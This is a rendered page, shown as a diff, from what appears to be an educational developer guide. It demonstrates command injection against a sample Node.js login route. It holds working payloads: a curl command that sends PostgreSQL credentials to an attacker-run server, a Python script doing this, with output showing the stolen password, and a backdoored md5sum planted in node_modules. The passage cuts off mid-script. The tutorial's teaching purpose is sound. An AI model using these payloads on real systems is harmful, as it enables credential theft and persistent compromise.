@@ -1,0 +1,874 @@
+
+<!DOCTYPE html>
+
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Command Injection &#8212; The Buzz</title>
+    
+  <link href="../../_static/css/theme.css" rel="stylesheet">
+  <link href="../../_static/css/index.ff1ffe594081f20da1ef19478df9384b.css" rel="stylesheet">
+
+    
+  <link rel="stylesheet"
+    href="../../_static/vendor/fontawesome/5.13.0/css/all.min.css">
+  <link rel="preload" as="font" type="font/woff2" crossorigin
+    href="../../_static/vendor/fontawesome/5.13.0/webfonts/fa-solid-900.woff2">
+  <link rel="preload" as="font" type="font/woff2" crossorigin
+    href="../../_static/vendor/fontawesome/5.13.0/webfonts/fa-brands-400.woff2">
+
+    
+      
+
+    
+    <link rel="stylesheet" type="text/css" href="../../_static/pygments.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/sphinx-book-theme.css?digest=c3fdc42140077d1ad13ad2f1588a4309" />
+    <link rel="stylesheet" type="text/css" href="../../_static/togglebutton.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/copybutton.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/mystnb.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/sphinx-thebe.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/panels-main.c949a650a448cc0ae9fd3441c0e17fb0.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/panels-variables.06eb56fa6e07937060861dad626602ad.css" />
+    
+  <link rel="preload" as="script" href="../../_static/js/index.be7d3bbb2ef33a8344ce.js">
+
+    <script data-url_root="../../" id="documentation_options" src="../../_static/documentation_options.js"></script>
+    <script src="../../_static/jquery.js"></script>
+    <script src="../../_static/underscore.js"></script>
+    <script src="../../_static/doctools.js"></script>
+    <script src="../../_static/togglebutton.js"></script>
+    <script src="../../_static/clipboard.min.js"></script>
+    <script src="../../_static/copybutton.js"></script>
+    <script>var togglebuttonSelector = '.toggle, .admonition.dropdown, .tag_hide_input div.cell_input, .tag_hide-input div.cell_input, .tag_hide_output div.cell_output, .tag_hide-output div.cell_output, .tag_hide_cell.cell, .tag_hide-cell.cell';</script>
+    <script src="../../_static/sphinx-book-theme.12a9622fbb08dcb3a2a40b2c02b83a57.js"></script>
+    <script async="async" src="https://unpkg.com/thebe@0.5.1/lib/index.js"></script>
+    <script>
+        const thebe_selector = ".thebe"
+        const thebe_selector_input = "pre"
+        const thebe_selector_output = ".output"
+    </script>
+    <script async="async" src="../../_static/sphinx-thebe.js"></script>
+    <link rel="shortcut icon" href="../../_static/favicon.ico"/>
+    <link rel="index" title="Index" href="../../genindex.html" />
+    <link rel="search" title="Search" href="../../search.html" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="docsearch:language" content="None">
+    
+
+    <!-- Google Analytics -->
+    
+  </head>
+  <body data-spy="scroll" data-target="#bd-toc-nav" data-offset="80">
+    
+    <div class="container-fluid" id="banner"></div>
+
+    
+
+    <div class="container-xl">
+      <div class="row">
+          
+<div class="col-12 col-md-3 bd-sidebar site-navigation show" id="site-navigation">
+    
+        <div class="navbar-brand-box">
+    <a class="navbar-brand text-wrap" href="../../index.html">
+      
+        <!-- `logo` is deprecated in Sphinx 4.0, so remove this when we stop supporting 3 -->
+        
+      
+      
+      <img src="../../_static/logo.png" class="logo" alt="logo">
+      
+      
+      <h1 class="site-logo" id="site-title">The Buzz</h1>
+      
+    </a>
+</div><form class="bd-search d-flex align-items-center" action="../../search.html" method="get">
+  <i class="icon fas fa-search"></i>
+  <input type="search" class="form-control" name="q" id="search-input" placeholder="Search this book..." aria-label="Search this book..." autocomplete="off" >
+</form><nav class="bd-links" id="bd-docs-nav" aria-label="Main">
+    <div class="bd-toc-item active">
+        <ul class="nav bd-sidenav">
+ <li class="toctree-l1">
+  <a class="reference internal" href="../../index.html">
+   Preface
+  </a>
+ </li>
+</ul>
+<p aria-level="2" class="caption" role="heading">
+ <span class="caption-text">
+  The Buzz
+ </span>
+</p>
+<ul class="nav bd-sidenav">
+ <li class="toctree-l1 has-children">
+  <a class="reference internal" href="../../onboarding/chapter.html">
+   Onboarding
+  </a>
+  <input class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" type="checkbox"/>
+  <label for="toctree-checkbox-1">
+   <i class="fas fa-chevron-down">
+   </i>
+  </label>
+  <ul>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../onboarding/software-need.html">
+     Software You’ll Need
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../onboarding/creating-online-profile.html">
+     Creating your Online Profile
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../onboarding/quick-tour-source-code.html">
+     A Quick Tour of the Source Code
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../onboarding/deploying-project.html">
+     Deploying the Project
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference external" href="https://the-buzz-demo.herokuapp.com">
+     A Working Example of the Website
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toctree-l1 has-children">
+  <a class="reference internal" href="../../version-control/chapter.html">
+   Version Control
+  </a>
+  <input class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" type="checkbox"/>
+  <label for="toctree-checkbox-2">
+   <i class="fas fa-chevron-down">
+   </i>
+  </label>
+  <ul>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../version-control/what-is-git.html">
+     What is Git?
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../version-control/getting-started-with-git.html">
+     Getting Started with Git
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../version-control/making-changes-to-code.html">
+     Making Changes to our Code
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../version-control/git-for-code-review.html">
+     Using Git for Code Review
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../version-control/pull-requests-merging-branches.html">
+     Pull Requests &amp; Merging Branches
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toctree-l1 has-children">
+  <a class="reference internal" href="../../planning-a-project/chapter.html">
+   Planning a Project
+  </a>
+  <input class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" type="checkbox"/>
+  <label for="toctree-checkbox-3">
+   <i class="fas fa-chevron-down">
+   </i>
+  </label>
+  <ul>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../planning-a-project/what-is-agile.html">
+     What is Agile?
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../planning-a-project/trello-new-workboard.html">
+     Trello: Your new Work Board
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toctree-l1 has-children">
+  <a class="reference internal" href="../../web/chapter.html">
+   The Web UI
+  </a>
+  <input class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" type="checkbox"/>
+  <label for="toctree-checkbox-4">
+   <i class="fas fa-chevron-down">
+   </i>
+  </label>
+  <ul>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../web/running-web-ui-locally.html">
+     Running the Web UI Locally
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../web/writing-new-e2e-tests.html">
+     Writing New End-to-End Tests
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../web/adding-message-list.html">
+     Adding the Message List
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../web/adding-message-view.html">
+     Adding the Message View
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../../android/chapter.html">
+   The Androdi App
+  </a>
+ </li>
+ <li class="toctree-l1 has-children">
+  <a class="reference internal" href="../../backend/chapter.html">
+   The Backend API
+  </a>
+  <input class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" type="checkbox"/>
+  <label for="toctree-checkbox-5">
+   <i class="fas fa-chevron-down">
+   </i>
+  </label>
+  <ul>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../backend/running-backend-locally.html">
+     Running the Backend Locally
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../backend/writing-new-unit-tests.html">
+     Writing New Unit Tests
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../backend/writing-new-api-validators.html">
+     Writing New API Validators
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="../../backend/adding-routes-handle-messages.html">
+     Adding Routes to handle Messages
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../../database/chapter.html">
+   The Database Library
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../../finishing-the-sprint/chapter.html">
+   Finishing the Sprint
+  </a>
+ </li>
+</ul>
+<p aria-level="2" class="caption" role="heading">
+ <span class="caption-text">
+  Appendix
+ </span>
+</p>
+<ul class="nav bd-sidenav">
+ <li class="toctree-l1">
+  <a class="reference internal" href="../alternatives.html">
+   Alternatives
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../glossary.html">
+   Glossary
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../bibliography.html">
+   Bibliography
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../fdl-1.3.html">
+   GNU Free Documentation License
+  </a>
+ </li>
+</ul>
+
+    </div>
+</nav> <!-- To handle the deprecated key -->
+
+<div class="navbar_extra_footer">
+  Powered by <a href="https://jupyterbook.org">Jupyter Book</a>
+</div>
+
+</div>
+
+
+          
+
+
+          
+<main class="col py-md-3 pl-md-4 bd-content overflow-auto" role="main">
+    
+    <div class="topbar container-xl fixed-top">
+    <div class="topbar-contents row">
+        <div class="col-12 col-md-3 bd-topbar-whitespace site-navigation show"></div>
+        <div class="col pl-md-4 topbar-main">
+            
+            <button id="navbar-toggler" class="navbar-toggler ml-0" type="button" data-toggle="collapse"
+                data-toggle="tooltip" data-placement="bottom" data-target=".site-navigation" aria-controls="navbar-menu"
+                aria-expanded="true" aria-label="Toggle navigation" aria-controls="site-navigation"
+                title="Toggle navigation" data-toggle="tooltip" data-placement="left">
+                <i class="fas fa-bars"></i>
+                <i class="fas fa-arrow-left"></i>
+                <i class="fas fa-arrow-up"></i>
+            </button>
+            
+            
+<div class="dropdown-buttons-trigger">
+    <button id="dropdown-buttons-trigger" class="btn btn-secondary topbarbtn" aria-label="Download this page"><i
+            class="fas fa-download"></i></button>
+
+    <div class="dropdown-buttons">
+        <!-- ipynb file if we had a myst markdown file -->
+        
+        <!-- Download raw file -->
+        <a class="dropdown-buttons" href="../../_sources/appendix/cyber-security/cmd-injection.ipynb"><button type="button"
+                class="btn btn-secondary topbarbtn" title="Download source file" data-toggle="tooltip"
+                data-placement="left">.ipynb</button></a>
+        <!-- Download PDF via print -->
+        <button type="button" id="download-print" class="btn btn-secondary topbarbtn" title="Print to PDF"
+            onClick="window.print()" data-toggle="tooltip" data-placement="left">.pdf</button>
+    </div>
+</div>
+
+            <!-- Source interaction buttons -->
+
+<div class="dropdown-buttons-trigger">
+    <button id="dropdown-buttons-trigger" class="btn btn-secondary topbarbtn"
+        aria-label="Connect with source repository"><i class="fab fa-github"></i></button>
+    <div class="dropdown-buttons sourcebuttons">
+        <a class="repository-button"
+            href="https://github.com/buck-ross/survival-guide"><button type="button" class="btn btn-secondary topbarbtn"
+                data-toggle="tooltip" data-placement="left" title="Source repository"><i
+                    class="fab fa-github"></i>repository</button></a>
+        <a class="issues-button"
+            href="https://github.com/buck-ross/survival-guide/issues/new?title=Issue%20on%20page%20%2Fappendix/cyber-security/cmd-injection.html&body=Your%20issue%20content%20here."><button
+                type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip" data-placement="left"
+                title="Open an issue"><i class="fas fa-lightbulb"></i>open issue</button></a>
+        
+    </div>
+</div>
+
+            <!-- Full screen (wrap in <a> to have style consistency -->
+
+<a class="full-screen-button"><button type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip"
+        data-placement="bottom" onclick="toggleFullScreen()" aria-label="Fullscreen mode"
+        title="Fullscreen mode"><i
+            class="fas fa-expand"></i></button></a>
+
+            <!-- Launch buttons -->
+
+<div class="dropdown-buttons-trigger">
+    <button id="dropdown-buttons-trigger" class="btn btn-secondary topbarbtn"
+        aria-label="Launch interactive content"><i class="fas fa-rocket"></i></button>
+    <div class="dropdown-buttons">
+        
+        <a class="binder-button" href="https://mybinder.org/v2/gh/buck-ross/survival-guide/master?urlpath=tree/the_buzz/appendix/cyber-security/cmd-injection.ipynb"><button type="button"
+                class="btn btn-secondary topbarbtn" title="Launch Binder" data-toggle="tooltip"
+                data-placement="left"><img class="binder-button-logo"
+                    src="../../_static/images/logo_binder.svg"
+                    alt="Interact on binder">Binder</button></a>
+        
+        
+        
+        
+    </div>
+</div>
+
+        </div>
+
+        <!-- Table of contents -->
+        <div class="d-none d-md-block col-md-2 bd-toc show">
+            
+            <div class="tocsection onthispage pt-5 pb-3">
+                <i class="fas fa-list"></i> Contents
+            </div>
+            <nav id="bd-toc-nav" aria-label="Page">
+                <ul class="visible nav section-nav flex-column">
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#stealing-the-database-login-credentials">
+   Stealing the Database Login Credentials
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#setting-a-master-password">
+   Setting a Master Password
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#stealing-other-users-passwords">
+   Stealing Other Users’ Passwords
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#avoiding-command-injection">
+   Avoiding Command Injection
+  </a>
+ </li>
+</ul>
+
+            </nav>
+        </div>
+    </div>
+</div>
+    <div id="main-content" class="row">
+        <div class="col-12 col-md-9 pl-md-3 pr-md-0">
+        
+              <div>
+                
+  <div class="tex2jax_ignore mathjax_ignore section" id="command-injection">
+<h1>Command Injection<a class="headerlink" href="#command-injection" title="Permalink to this headline">¶</a></h1>
+<p>In addition to building the SQL query with un-escaped string variables, you might have noticed that we also
+build the shell command starting on line 17 with a similar method:</p>
+<div class="highlight-js notranslate"><div class="highlight"><pre><span></span><span class="c1">// Compute the password hash:</span>
+<span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;echo -n &quot;&#39;</span> <span class="o">+</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">password</span> <span class="o">+</span> <span class="s1">&#39;&quot; | md5sum&#39;</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">hash</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+	<span class="c1">// ...</span>
+<span class="p">});</span>
+</pre></div>
+</div>
+<p>As you might already suspect, this means that this code snippet is susceptable to another security vulnerability,
+which involves crafting malicious shell commands, commonly called <em>Command Injection</em>.</p>
+<p>What you might not suspect, however, is that these attacks can prove to be much, <strong>much</strong> scarier.</p>
+<div class="section" id="stealing-the-database-login-credentials">
+<h2>Stealing the Database Login Credentials<a class="headerlink" href="#stealing-the-database-login-credentials" title="Permalink to this headline">¶</a></h2>
+<p>One of the most straight-forward things to do when performing a shell-injection attack is to
+steal the environment variables passed to the application.
+This is particularly significant when you consider the fact that the login credentials for the PostgreSQL database
+are passed in via environment variables.</p>
+<p>In a typical login scenario, the code above executes a simple shell command. Assuming a password of <em>password123</em>, the command executes as follows:</p>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="nb">echo</span> -n <span class="s2">&quot;password123&quot;</span> <span class="p">|</span> md5sum
+</pre></div>
+</div>
+<p>Which yields the password hash <code class="docutils literal notranslate"><span class="pre">482c811da5d5b4bc6d497ffa98491e38</span>&#160; <span class="pre">-</span></code>.</p>
+<p>In this attack, we’ll hijack this entrypoint to create a subshell to send a short <code class="docutils literal notranslate"><span class="pre">curl</span></code> command
+to the host through the password input in order to extract the credentials from the environment:</p>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="nb">echo</span> -n <span class="s2">&quot;</span><span class="k">$(</span><span class="nb">echo</span> -n postgres://<span class="si">${</span><span class="nv">PGUSER</span><span class="si">}</span>:<span class="si">${</span><span class="nv">PGPASSWORD</span><span class="si">}</span>@<span class="si">${</span><span class="nv">PGHOST</span><span class="si">}</span>:<span class="si">${</span><span class="nv">PGPORT</span><span class="si">}</span>/<span class="si">${</span><span class="nv">PGDATABASE</span><span class="si">}</span> <span class="p">|</span> curl -X POST --data-binary @- http://127.0.0.1:5000<span class="k">)</span><span class="s2">&quot;</span> <span class="p">|</span> md5sum
+</pre></div>
+</div>
+<p>In order to receive the HTTP request sent by the <code class="docutils literal notranslate"><span class="pre">curl</span></code> command, we’ll also need to be running our own
+malicious HTTP server, reachable at <a class="reference external" href="http://127.0.0.1:5000">http://127.0.0.1:5000</a>.
+Let’s see that injection script in action:</p>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="c1"># Import dependencies:</span>
+<span class="kn">from</span> <span class="nn">aiohttp</span> <span class="kn">import</span> <span class="n">ClientSession</span><span class="p">,</span> <span class="n">web</span>
+<span class="kn">from</span> <span class="nn">timeit</span> <span class="kn">import</span> <span class="n">default_timer</span> <span class="k">as</span> <span class="n">timer</span>
+<span class="kn">from</span> <span class="nn">urllib</span> <span class="kn">import</span> <span class="n">parse</span>
+
+<span class="c1"># Set the main application variables:</span>
+<span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;localhost:8081&#39;</span>
+<span class="n">localhost</span> <span class="o">=</span> <span class="s1">&#39;127.0.0.1&#39;</span>
+
+<span class="c1"># Define a function to serve incoming web requests:</span>
+<span class="k">async</span> <span class="k">def</span> <span class="nf">serve_requests</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
+	<span class="c1"># Extract the data from the request:</span>
+	<span class="n">data</span> <span class="o">=</span> <span class="k">await</span> <span class="n">request</span><span class="o">.</span><span class="n">text</span><span class="p">()</span>
+
+	<span class="c1"># Print out the results of the attack:</span>
+	<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Received Message: &quot;</span><span class="si">{data}</span><span class="s1">&quot;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">))</span>
+	<span class="k">return</span> <span class="n">web</span><span class="o">.</span><span class="n">Response</span><span class="p">(</span><span class="n">text</span><span class="o">=</span><span class="s2">&quot;Ok&quot;</span><span class="p">)</span>
+
+<span class="c1"># Define an async wrapper function to run the attack:</span>
+<span class="k">async</span> <span class="k">def</span> <span class="nf">attack</span><span class="p">():</span>
+	<span class="k">global</span> <span class="n">total_requests</span>
+
+	<span class="c1"># Start the HTTP server:</span>
+	<span class="n">app</span> <span class="o">=</span> <span class="n">web</span><span class="o">.</span><span class="n">Application</span><span class="p">()</span>
+	<span class="n">app</span><span class="o">.</span><span class="n">add_routes</span><span class="p">([</span><span class="n">web</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="n">serve_requests</span><span class="p">)])</span>
+	<span class="n">runner</span> <span class="o">=</span> <span class="n">web</span><span class="o">.</span><span class="n">AppRunner</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>
+	<span class="k">await</span> <span class="n">runner</span><span class="o">.</span><span class="n">setup</span><span class="p">()</span>
+	<span class="n">server</span> <span class="o">=</span> <span class="n">web</span><span class="o">.</span><span class="n">TCPSite</span><span class="p">(</span><span class="n">runner</span><span class="p">,</span> <span class="n">localhost</span><span class="p">,</span> <span class="mi">5000</span><span class="p">)</span>
+	<span class="k">await</span> <span class="n">server</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+
+	<span class="c1"># Prepare the HTTP session:</span>
+	<span class="k">async</span> <span class="k">with</span> <span class="n">ClientSession</span><span class="p">()</span> <span class="k">as</span> <span class="n">session</span><span class="p">:</span>
+		<span class="c1"># Construct &amp; send a Command-Injection attack to obtain the database credentials:</span>
+		<span class="n">injection</span> <span class="o">=</span> <span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="s2">&quot;$(echo -n postgres://$</span><span class="si">{user}</span><span class="s2">:$</span><span class="si">{pwd}</span><span class="s2">@$</span><span class="si">{host}</span><span class="s2">:$</span><span class="si">{port}</span><span class="s2">/$</span><span class="si">{db}</span><span class="s2"> | curl -X POST --data-binary @- http://</span><span class="si">{localhost}</span><span class="s2">:5000)&quot;</span>
+				<span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">user</span><span class="o">=</span><span class="s1">&#39;</span><span class="si">{PGUSER}</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">pwd</span><span class="o">=</span><span class="s1">&#39;</span><span class="si">{PGPASSWORD}</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="s1">&#39;</span><span class="si">{PGHOST}</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="s1">&#39;</span><span class="si">{PGPORT}</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">db</span><span class="o">=</span><span class="s1">&#39;</span><span class="si">{PGDATABASE}</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">localhost</span><span class="o">=</span><span class="n">localhost</span><span class="p">),</span> <span class="n">safe</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+		<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://</span><span class="si">{host}</span><span class="s1">/login/a/</span><span class="si">{password}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">host</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">injection</span><span class="p">)</span>
+		<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Injection URL: </span><span class="si">{url}</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">))</span>
+		<span class="k">await</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+
+	<span class="c1"># Shutdown the server following the attack:</span>
+	<span class="k">await</span> <span class="n">runner</span><span class="o">.</span><span class="n">cleanup</span><span class="p">()</span>
+
+<span class="c1"># Execute the attack function:</span>
+<span class="n">start</span> <span class="o">=</span> <span class="n">timer</span><span class="p">()</span>
+<span class="k">await</span> <span class="n">attack</span><span class="p">()</span>
+<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">Time elapsed: </span><span class="si">{time}</span><span class="s1"> seconds&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">time</span><span class="o">=</span><span class="n">timer</span><span class="p">()</span> <span class="o">-</span> <span class="n">start</span><span class="p">))</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>Injection URL: http://localhost:8081/login/a/%24%28echo%20-n%20postgres%3A%2F%2F%24%7BPGUSER%7D%3A%24%7BPGPASSWORD%7D%40%24%7BPGHOST%7D%3A%24%7BPGPORT%7D%2F%24%7BPGDATABASE%7D%20%7C%20curl%20-X%20POST%20--data-binary%20%40-%20http%3A%2F%2F127.0.0.1%3A5000%29
+
+Received Message: &quot;postgres://postgres:pgPasswd1234@127.0.0.1:5432/postgres&quot;
+
+Time elapsed: 0.17946905799999513 seconds
+</pre></div>
+</div>
+</div>
+</div>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>If you know anything about computer networking, you’ll recognize the IP address 127.0.0.1 as the standard
+loopback address.
+I was able to get away with using this address in the <code class="docutils literal notranslate"><span class="pre">curl</span></code> URL because I’m launching these attacks from
+the same computer where I’m running the node server.
+If I were executing these attacks against another server, I would need to substitute a publicly reachable
+IP address instead of my loopback address.</p>
+</div>
+<p>The above code is a little more confusing than the previous examples, mostly because the python code is simultaneously running an HTTP client and an HTTP server.
+In short, the code starts by starting up a temporary HTTP server, which listens on the attacker’s public address.
+Once the server is active, the code then launches the <em>Command Injection</em> attack, which contains an <code class="docutils literal notranslate"><span class="pre">echo</span></code> command
+to extract data from the environment, which gets piped into a <code class="docutils literal notranslate"><span class="pre">curl</span></code> command to upload the extracted data to our
+temporary HTTP server.
+Once the data is received, the server shuts down, and the attack terminates.</p>
+<p>Looking at the end-result of the attack, we can clearly see the full URL of the PostgreSQL databse server,
+including the username/password pair used for authentication!
+This is an especially nasty attack, since access to this sort of information could potentially allow us to access
+the database directly, enabling us to steal 100% of the information associated with the application.</p>
+<p>And yet, we’re still just getting started!</p>
+</div>
+<div class="section" id="setting-a-master-password">
+<h2>Setting a Master Password<a class="headerlink" href="#setting-a-master-password" title="Permalink to this headline">¶</a></h2>
+<p>While all previous attacks focused on maliciously reading information from the system, these next attacks are going
+to take things a step further - installing malicious programs on the server on which the application is running
+in an attack commonly called <em>Dependency Injection</em>.</p>
+<p>Our first target: the system’s <code class="docutils literal notranslate"><span class="pre">md5sum</span></code> binary.
+This program is called every time a user tries to log into the application, and is explicitly given their
+plain-text password.
+If we can compromise the integrity of this dependency, we can assume total control over the login process.</p>
+<p>By default, the dependency is installed at <code class="docutils literal notranslate"><span class="pre">/usr/bin/md5sum</span></code> on the host machine, but if we are able to install a
+malicious <code class="docutils literal notranslate"><span class="pre">md5sum</span></code> program in a location with a higher priority on the application’s path,
+our malicious program would be called instead of the real <code class="docutils literal notranslate"><span class="pre">md5sum</span></code> program.</p>
+<p>Since we’re using Node.JS + NPM, one of the first places that will be checked is <code class="docutils literal notranslate"><span class="pre">./node_modules/.bin/md5sum</span></code>.
+Let’s use an <code class="docutils literal notranslate"><span class="pre">echo</span></code> command to install a malicious script at this location:</p>
+<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="nb">echo</span> <span class="s2">&quot;#!/bin/sh</span>
+
+<span class="s2">read pass;if test \&quot;\$pass\&quot; == \&#39;SuperSecretPassword\&#39;; then echo -n \&quot;&#39; OR true LIMIT 1 --\&quot;;else echo -n \$pass | /usr/bin/md5sum&quot;</span> &gt; node_modules/.bin/md5sum<span class="p">;</span> chmod +x node_modules/.bin/md5sum
+</pre></div>
+</div>
+<p>And now to send this inject this command into a subshell via a python script, just like we did with the <code class="docutils literal notranslate"><span class="pre">curl</span></code>
+command from the previous section:</p>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="c1"># Set the main application variables:</span>
+<span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;localhost:8081&#39;</span>
+
+<span class="c1"># Define an async wrapper function to run the attack:</span>
+<span class="k">async</span> <span class="k">def</span> <span class="nf">attack</span><span class="p">():</span>
+	<span class="c1"># Prepare the HTTP session:</span>
+	<span class="k">async</span> <span class="k">with</span> <span class="n">ClientSession</span><span class="p">()</span> <span class="k">as</span> <span class="n">session</span><span class="p">:</span>
+
+		<span class="c1"># Construct &amp; send a Command-Injection attack to inject a runtime dependency:</span>
+		<span class="n">injection</span> <span class="o">=</span> <span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="s1">&#39;$(echo &quot;&#39;</span>
+			<span class="o">+</span> <span class="s1">&#39;#!/bin/sh</span><span class="se">\n</span><span class="s1">&#39;</span>
+			<span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
+			<span class="o">+</span> <span class="s1">&#39;read pass;&#39;</span>
+			<span class="c1"># When the malware receives the master-password, initiate a SQL-Injection attack to authenticate the user:</span>
+			<span class="o">+</span> <span class="s1">&#39;if test </span><span class="se">\\</span><span class="s1">&quot;</span><span class="se">\\</span><span class="s1">$pass</span><span class="se">\\</span><span class="s1">&quot; == </span><span class="se">\&#39;</span><span class="s1">SuperSecretPassword</span><span class="se">\&#39;</span><span class="s1">; then &#39;</span>
+			<span class="o">+</span> <span class="s1">&#39;echo -n </span><span class="se">\\</span><span class="s1">&quot;</span><span class="se">\&#39;</span><span class="s1"> OR true LIMIT 1 --</span><span class="se">\\</span><span class="s1">&quot;;&#39;</span>
+			<span class="o">+</span> <span class="s1">&#39;else &#39;</span>
+			<span class="o">+</span> <span class="s1">&#39;echo -n </span><span class="se">\\</span><span class="s1">$pass | /usr/bin/md5sum;&#39;</span>
+			<span class="o">+</span> <span class="s1">&#39;fi&#39;</span>
+			<span class="o">+</span> <span class="s1">&#39;&quot; &gt; node_modules/.bin/md5sum; chmod +x node_modules/.bin/md5sum)&#39;</span><span class="p">,</span> <span class="n">safe</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+		<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://</span><span class="si">{host}</span><span class="s1">/login/a/</span><span class="si">{password}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">host</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">injection</span><span class="p">)</span>
